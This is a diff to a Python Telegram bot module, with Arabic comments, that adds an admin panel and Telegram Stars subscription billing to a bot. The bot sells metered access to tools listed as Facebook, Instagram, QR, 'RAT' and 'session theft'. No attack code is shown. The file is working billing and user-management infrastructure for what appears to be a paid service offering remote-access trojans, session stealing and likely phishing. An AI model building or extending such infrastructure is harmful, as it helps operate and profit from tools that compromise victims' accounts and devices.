@@ -1,5 +1,5 @@
 # stars_payment.py
-# نظام الدفع بنجوم تلجرام - نسخة مُصلحة تعمل 100%
+# نظام الدفع بنجوم تلجرام + نظام الأدمن الكامل
 
 import os
 import json
@@ -12,7 +12,7 @@ from telebot.types import (
 )
 
 # ============================================================
-# [1] الخطط والأسعار
+# [1] الإعدادات العامة
 # ============================================================
 PRICING_PLANS = {
     "basic": {
@@ -42,6 +42,19 @@ FREE_TRIAL_USES = 1
 AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh"]
 
 # ============================================================
+# ★★★ قائمة الأدمن — ضع chat_id الخاص بك هنا ★★★
+# ============================================================
+ADMIN_IDS = [
+    7631249810,  # ← ضع chat_id الخاص بك
+]
+
+# قائمة VIP — مستخدمون بلا حدود (يمنحهم الأدمن)
+VIP_IDS = [
+    7631249810,
+]
+
+
+# ============================================================
 # [2] Redis
 # ============================================================
 REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
@@ -60,7 +73,41 @@ except Exception as e:
 
 
 # ============================================================
-# [3] إدارة المستخدمين
+# [3] التحقق من الأدمن
+# ============================================================
+def is_admin(user_id):
+    """هل المستخدم أدمن؟"""
+    return int(user_id) in ADMIN_IDS
+
+
+def is_vip(user_id):
+    """هل المستخدم VIP؟"""
+    if int(user_id) in ADMIN_IDS:
+        return True
+    if int(user_id) in VIP_IDS:
+        return True
+    return False
+
+
+def require_admin(func):
+    """Decorator — للتحقق من الأدمن"""
+    def wrapper(*args, **kwargs):
+        # في telegram callbacks، args[0] = call
+        first = args[0] if args else None
+        user_id = None
+        if first is not None:
+            if hasattr(first, 'from_user'):
+                user_id = first.from_user.id
+            elif hasattr(first, 'message'):
+                user_id = first.message.chat.id
+        if user_id and is_admin(user_id):
+            return func(*args, **kwargs)
+        print(f"[-] Unauthorized admin attempt by {user_id}")
+    return wrapper
+
+
+# ============================================================
+# [4] إدارة المستخدمين
 # ============================================================
 def _user_key(user_id):
     return f"user:{user_id}"
@@ -101,8 +148,17 @@ def create_new_user(user_id, username="Unknown", first_name="User"):
         "purchases": [],
         "daily_reset_date": datetime.utcnow().strftime("%Y-%m-%d"),
         "daily_uses_count": 0,
+        "is_banned": False,
+        "is_vip": False,
+        "notes": "",
     }
     save_user(user_id, user)
+    # سجل المستخدم في مجموعة
+    if redis_client:
+        try:
+            redis_client.sadd("all_users", str(user_id))
+        except Exception:
+            pass
     return user
 
 
@@ -110,6 +166,7 @@ def get_or_create_user(user_id, username="Unknown", first_name="User"):
     user = get_user(user_id)
     if not user:
         user = create_new_user(user_id, username, first_name)
+    # تحديثات إضافية
     if "trial_uses" not in user:
         user["trial_uses"] = {tool: FREE_TRIAL_USES for tool in AVAILABLE_TOOLS}
     for tool in AVAILABLE_TOOLS:
@@ -117,7 +174,57 @@ def get_or_create_user(user_id, username="Unknown", first_name="User"):
     if "daily_reset_date" not in user:
         user["daily_reset_date"] = datetime.utcnow().strftime("%Y-%m-%d")
         user["daily_uses_count"] = 0
+    if "is_banned" not in user:
+        user["is_banned"] = False
+    if "is_vip" not in user:
+        user["is_vip"] = False
+    if "notes" not in user:
+        user["notes"] = ""
     return user
+
+
+def get_all_users():
+    """يرجع قائمة كل المستخدمين"""
+    if not redis_client:
+        return []
+    try:
+        user_ids = redis_client.smembers("all_users")
+        users = []
+        for uid in (user_ids or []):
+            u = get_user(uid)
+            if u:
+                users.append(u)
+        return users
+    except Exception as e:
+        print(f"[-] get_all_users error: {e}")
+        return []
+
+
+def delete_user(user_id):
+    """يحذف مستخدم تماماً"""
+    if not redis_client:
+        return False
+    try:
+        redis_client.delete(_user_key(user_id))
+        redis_client.srem("all_users", str(user_id))
+        return True
+    except Exception as e:
+        print(f"[-] delete_user error: {e}")
+        return False
+
+
+def ban_user(user_id):
+    """يحظر مستخدم"""
+    user = get_or_create_user(user_id)
+    user["is_banned"] = True
+    return save_user(user_id, user)
+
+
+def unban_user(user_id):
+    """يفك حظر مستخدم"""
+    user = get_or_create_user(user_id)
+    user["is_banned"] = False
+    return save_user(user_id, user)
 
 
 def _today_key():
@@ -133,7 +240,7 @@ def _reset_daily_counter_if_needed(user):
 
 
 # ============================================================
-# [4] التحقق من الصلاحيات
+# [5] التحقق من الصلاحيات — VIP لا نهائي
 # ============================================================
 def check_subscription_active(user):
     sub = user.get("subscription")
@@ -149,11 +256,25 @@ def check_subscription_active(user):
 def can_use_tool(user_id, tool):
     user = get_or_create_user(user_id)
     user = _reset_daily_counter_if_needed(user)
-
+    
+    # 🚫 محظور؟
+    if user.get("is_banned"):
+        return {"allowed": False, "reason": "banned"}
+    
+    # 👑 الأدمن دائماً مسموح
+    if is_admin(user_id):
+        return {"allowed": True, "reason": "admin", "unlimited": True}
+    
+    # 💎 VIP ممنوح من الأدمن
+    if user.get("is_vip") or is_vip(user_id):
+        return {"allowed": True, "reason": "vip", "unlimited": True}
+    
+    # 🎁 الاستخدام المجاني
     trial = user.get("trial_uses", {})
     if trial.get(tool, 0) > 0:
         return {"allowed": True, "reason": "free_trial", "remaining_free": trial[tool]}
-
+    
+    # 📅 الاشتراك
     if check_subscription_active(user):
         plan_key = user["subscription"]["plan"]
         plan = PRICING_PLANS.get(plan_key, {})
@@ -163,21 +284,27 @@ def can_use_tool(user_id, tool):
             return {"allowed": True, "reason": "subscription",
                     "remaining_today": daily_limit - used_today}
         return {"allowed": False, "reason": "daily_limit_reached", "daily_limit": daily_limit}
-
+    
     return {"allowed": False, "reason": "no_credit", "remaining_free": 0}
 
 
 def consume_usage(user_id, tool):
     user = get_or_create_user(user_id)
     user = _reset_daily_counter_if_needed(user)
-
+    
+    # الأدمن و VIP لا يستهلكون
+    if is_admin(user_id) or user.get("is_vip") or is_vip(user_id):
+        return True
+    
+    # الاستخدام المجاني
     trial = user.get("trial_uses", {})
     if trial.get(tool, 0) > 0:
         trial[tool] -= 1
         user["trial_uses"] = trial
         save_user(user_id, user)
         return True
-
+    
+    # الاشتراك
     if check_subscription_active(user):
         user["daily_uses_count"] = user.get("daily_uses_count", 0) + 1
         save_user(user_id, user)
@@ -186,7 +313,7 @@ def consume_usage(user_id, tool):
 
 
 # ============================================================
-# [5] لوحات الباقات
+# [6] لوحات الباقات
 # ============================================================
 def build_plans_keyboard():
     markup = InlineKeyboardMarkup()
@@ -225,12 +352,8 @@ def build_account_text(user_id):
 
     trial = user.get("trial_uses", {})
     tool_names = {
-        "fb": "فيسبوك",
-        "ig": "انستقرام",
-        "qr": "QR Code",
-        "rat": "RAT",
-        "lsh": "LSH",
-        "sh": "سرقة الجلسات",
+        "fb": "فيسبوك", "ig": "انستقرام", "qr": "QR Code",
+        "rat": "RAT", "lsh": "LSH", "sh": "سرقة الجلسات",
     }
 
     trial_lines = []
@@ -238,33 +361,42 @@ def build_account_text(user_id):
         trial_lines.append(f"  • {tool_names.get(tool, tool)}: {count} متبقية")
     trial_text = "\n".join(trial_lines) if trial_lines else "  لا يوجد"
 
-    sub_text = "❌ لا يوجد اشتراك نشط"
-    if check_subscription_active(user):
+    # حالة الحساب
+    status = ""
+    if is_admin(user_id):
+        status = "👑 **أدمن** — كل شيء مفتوح (لا نهائي)"
+    elif user.get("is_banned"):
+        status = "🚫 **محظور** — لا يمكنك استخدام البوت"
+    elif user.get("is_vip") or is_vip(user_id):
+        status = "💎 **VIP** — كل شيء بدون حدود"
+    elif check_subscription_active(user):
         plan_key = user["subscription"]["plan"]
         plan = PRICING_PLANS.get(plan_key, {})
         expires = datetime.fromisoformat(user["subscription"]["expires_at"])
         remaining_days = (expires - datetime.utcnow()).days
         used_today = user.get("daily_uses_count", 0)
-        sub_text = (
-            f"✅ {plan['name']}\n"
+        status = (
+            f"✅ **{plan['name']}**\n"
             f"  📅 متبقي: {remaining_days} يوم\n"
             f"  🎯 استخدام اليوم: {used_today}/{plan['daily_limit']}"
         )
+    else:
+        status = "❌ لا يوجد اشتراك نشط"
 
     return (
         f"👤 **حسابك الشخصي**\n"
         f"━━━━━━━━━━━━━━━━━━\n"
         f"🆔 الآيدي: `{user_id}`\n"
         f"👋 الاسم: {user.get('first_name', 'Unknown')}\n\n"
-        f"🎁 **الاستخدام المجاني المتبقي:**\n{trial_text}\n\n"
-        f"💎 **الاشتراك الحالي:**\n{sub_text}\n"
+        f"📊 **حالتك:**\n{status}\n\n"
+        f"🎁 **الاستخدام المجاني المتبقي:**\n{trial_text}\n"
         f"━━━━━━━━━━━━━━━━━━\n"
         f"💰 إجمالي النجوم المصروفة: {user.get('total_stars_spent', 0)}⭐"
     )
 
 
 # ============================================================
-# [6] الفاتورة والدفع
+# [7] الفاتورة والدفع
 # ============================================================
 def send_invoice(bot, chat_id, plan_key):
     plan = PRICING_PLANS.get(plan_key)
@@ -293,24 +425,6 @@ def send_invoice(bot, chat_id, plan_key):
         print(f"[+] Invoice sent: {chat_id} -> {plan_key}")
     except Exception as e:
         print(f"[-] send_invoice error: {e}")
-        try:
-            bot.send_invoice(
-                chat_id=chat_id,
-                title=plan["name"],
-                description=f"اشتراك {plan['days']} يوم",
-                invoice_payload=payload,
-                provider_token="",
-                currency="XTR",
-                prices=[LabeledPrice(label=plan["name"], amount=plan["stars"])],
-            )
-            print(f"[+] Invoice sent (retry)")
-        except Exception as e2:
-            print(f"[-] send_invoice retry error: {e2}")
-            bot.send_message(
-                chat_id,
-                f"❌ **فشل إنشاء الفاتورة**\n\n`{str(e2)[:200]}`",
-                parse_mode="Markdown"
-            )
 
 
 def activate_subscription(user_id, plan_key):
@@ -344,7 +458,7 @@ def activate_subscription(user_id, plan_key):
 
 
 # ============================================================
-# [7] تسجيل معالجات الدفع في البوت
+# [8] تسجيل معالجات الدفع + معالجات الأدمن
 # ============================================================
 def register_payment_handlers(bot):
 
@@ -360,11 +474,8 @@ def register_payment_handlers(bot):
     def successful_payment(message):
         try:
             payload = message.successful_payment.invoice_payload
-            print(f"[+] Successful payment payload: {payload}")
-
             parts = payload.split("|")
             if len(parts) < 3:
-                print(f"[-] Invalid payload: {payload}")
                 return
 
             plan_key = parts[1]
@@ -374,7 +485,6 @@ def register_payment_handlers(bot):
                 user_id = message.from_user.id
 
             if message.from_user.id != user_id:
-                print(f"[!] User mismatch, using sender ID")
                 user_id = message.from_user.id
 
             user = activate_subscription(user_id, plan_key)
@@ -403,3 +513,198 @@ def register_payment_handlers(bot):
             print(f"[-] successful_payment error: {e}")
             import traceback
             traceback.print_exc()
+
+
+# ============================================================
+# [9] ★★★ دوال الأدمن ★★★
+# ============================================================
+def build_admin_menu():
+    """لوحة الأدمن الرئيسية"""
+    m = InlineKeyboardMarkup()
+    m.row(
+        InlineKeyboardButton("👥 قائمة المستخدمين", callback_data="admin_users_0"),
+    )
+    m.row(
+        InlineKeyboardButton("➕ إضافة مستخدم لباقة", callback_data="admin_add_sub"),
+        InlineKeyboardButton("💎 منح VIP", callback_data="admin_grant_vip"),
+    )
+    m.row(
+        InlineKeyboardButton("🚫 حظر مستخدم", callback_data="admin_ban"),
+        InlineKeyboardButton("✅ فك حظر", callback_data="admin_unban"),
+    )
+    m.row(
+        InlineKeyboardButton("🗑️ حذف مستخدم", callback_data="admin_delete"),
+        InlineKeyboardButton("🔍 بحث", callback_data="admin_search"),
+    )
+    m.row(
+        InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"),
+        InlineKeyboardButton("📢 رسالة جماعية", callback_data="admin_broadcast"),
+    )
+    m.row(
+        InlineKeyboardButton("⭐ إعطاء نجوم", callback_data="admin_give_stars"),
+        InlineKeyboardButton("📋 آخر المسجلين", callback_data="admin_recent"),
+    )
+    m.row(
+        InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"),
+    )
+    return m
+
+
+def build_admin_users_keyboard(users, page=0, per_page=10):
+    """قائمة المستخدمين مع pagination"""
+    m = InlineKeyboardMarkup()
+    
+    start = page * per_page
+    end = start + per_page
+    page_users = users[start:end]
+    
+    for u in page_users:
+        uid = u.get("user_id")
+        name = (u.get("first_name") or u.get("username") or "Unknown")[:20]
+        
+        # أيقونة الحالة
+        if is_admin(uid):
+            icon = "👑"
+        elif u.get("is_banned"):
+            icon = "🚫"
+        elif u.get("is_vip"):
+            icon = "💎"
+        elif check_subscription_active(u):
+            icon = "✅"
+        else:
+            icon = "👤"
+        
+        m.row(
+            InlineKeyboardButton(f"{icon} {name} | {uid}", callback_data=f"admin_user_{uid}")
+        )
+    
+    # Pagination
+    nav_buttons = []
+    total_pages = (len(users) + per_page - 1) // per_page
+    if page > 0:
+        nav_buttons.append(InlineKeyboardButton("⬅️ السابق", callback_data=f"admin_users_{page-1}"))
+    nav_buttons.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
+    if page < total_pages - 1:
+        nav_buttons.append(InlineKeyboardButton("التالي ➡️", callback_data=f"admin_users_{page+1}"))
+    
+    if nav_buttons:
+        m.row(*nav_buttons)
+    
+    m.row(InlineKeyboardButton("🔙 رجوع للأدمن", callback_data="admin_panel"))
+    return m
+
+
+def build_user_detail_keyboard(uid, user):
+    """لوحة تحكم بمستخدم واحد"""
+    m = InlineKeyboardMarkup()
+    
+    if user.get("is_banned"):
+        m.row(InlineKeyboardButton("✅ فك الحظر", callback_data=f"admin_unban_user_{uid}"))
+    else:
+        m.row(InlineKeyboardButton("🚫 حظر", callback_data=f"admin_ban_user_{uid}"))
+    
+    if user.get("is_vip"):
+        m.row(InlineKeyboardButton("❌ إزالة VIP", callback_data=f"admin_remove_vip_{uid}"))
+    else:
+        m.row(InlineKeyboardButton("💎 منح VIP", callback_data=f"admin_grant_vip_user_{uid}"))
+    
+    m.row(
+        InlineKeyboardButton("📅 إعطاء اشتراك", callback_data=f"admin_give_sub_{uid}"),
+        InlineKeyboardButton("⭐ إعطاء نجوم", callback_data=f"admin_give_stars_{uid}"),
+    )
+    m.row(
+        InlineKeyboardButton("🗑️ حذف نهائي", callback_data=f"admin_delete_user_{uid}"),
+    )
+    m.row(
+        InlineKeyboardButton("📨 رسالة له", callback_data=f"admin_msg_user_{uid}"),
+        InlineKeyboardButton("🔙 رجوع", callback_data="admin_users_0"),
+    )
+    return m
+
+
+def build_user_info_text(uid, user):
+    """نص معلومات المستخدم"""
+    # الحالة
+    if is_admin(uid):
+        status = "👑 أدمن"
+    elif user.get("is_banned"):
+        status = "🚫 محظور"
+    elif user.get("is_vip"):
+        status = "💎 VIP"
+    elif check_subscription_active(user):
+        plan_key = user["subscription"]["plan"]
+        plan = PRICING_PLANS.get(plan_key, {})
+        expires = datetime.fromisoformat(user["subscription"]["expires_at"])
+        days_left = (expires - datetime.utcnow()).days
+        status = f"✅ {plan['name']} ({days_left} يوم متبقي)"
+    else:
+        status = "👤 مجاني"
+    
+    # التواريخ
+    created = user.get("created_at", "")[:19].replace("T", " ")
+    
+    # عدد الاستخدامات
+    total_uses = 0
+    for tool, count in user.get("trial_uses", {}).items():
+        total_uses += (FREE_TRIAL_USES - count)
+    
+    # الاشتراكات
+    purchases = user.get("purchases", [])
+    total_spent = user.get("total_stars_spent", 0)
+    
+    # آخر استخدام
+    daily_uses = user.get("daily_uses_count", 0)
+    
+    return (
+        f"👤 **معلومات المستخدم**\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"🆔 `{uid}`\n"
+        f"👋 الاسم: {user.get('first_name', 'Unknown')}\n"
+        f"📝 Username: @{user.get('username', 'N/A')}\n\n"
+        f"📊 **الحالة:** {status}\n"
+        f"📅 **التسجيل:** `{created}`\n"
+        f"🎯 **استخدام اليوم:** `{daily_uses}`\n"
+        f"⭐ **إجمالي المصروف:** `{total_spent}` نجمة\n"
+        f"🛍️ **عدد المشتريات:** `{len(purchases)}`\n\n"
+        f"🎁 **الاستخدام المجاني:**\n"
+        f"• فيسبوك: `{user.get('trial_uses', {}).get('fb', 0)}`\n"
+        f"• انستقرام: `{user.get('trial_uses', {}).get('ig', 0)}`\n"
+        f"• QR: `{user.get('trial_uses', {}).get('qr', 0)}`\n"
+        f"• RAT: `{user.get('trial_uses', {}).get('rat', 0)}`\n"
+        f"• LSH: `{user.get('trial_uses', {}).get('lsh', 0)}`\n"
+        f"• SH: `{user.get('trial_uses', {}).get('sh', 0)}`\n\n"
+        f"📝 **ملاحظات:** `{user.get('notes', 'لا يوجد')}`"
+    )
+
+
+def build_admin_stats_text():
+    """إحصائيات شاملة"""
+    users = get_all_users()
+    
+    total_users = len(users)
+    banned = sum(1 for u in users if u.get("is_banned"))
+    vips = sum(1 for u in users if u.get("is_vip"))
+    subscribed = sum(1 for u in users if check_subscription_active(u))
+    
+    total_stars = sum(u.get("total_stars_spent", 0) for u in users)
+    total_purchases = sum(len(u.get("purchases", [])) for u in users)
+    
+    # آخر 24 ساعة
+    now = time.time()
+    recent = sum(1 for u in users 
+                 if u.get("created_at") and 
+                 (now - datetime.fromisoformat(u["created_at"]).timestamp()) < 86400)
+    
+    return (
+        f"📊 **إحصائيات النظام**\n"
+        f"━━━━━━━━━━━━━━━━━━\n\n"
+        f"👥 **إجمالي المستخدمين:** `{total_users}`\n"
+        f"✅ **المشتركين النشطين:** `{subscribed}`\n"
+        f"💎 **VIP:** `{vips}`\n"
+        f"🚫 **المحظورين:** `{banned}`\n"
+        f"🆕 **آخر 24 ساعة:** `{recent}`\n\n"
+        f"💰 **إجمالي النجوم:** `{total_stars}` ⭐\n"
+        f"🛍️ **إجمالي المشتريات:** `{total_purchases}`\n\n"
+        f"👑 **الأدمن:** `{len(ADMIN_IDS)}`\n"
+        f"━━━━━━━━━━━━━━━━━━"
+)
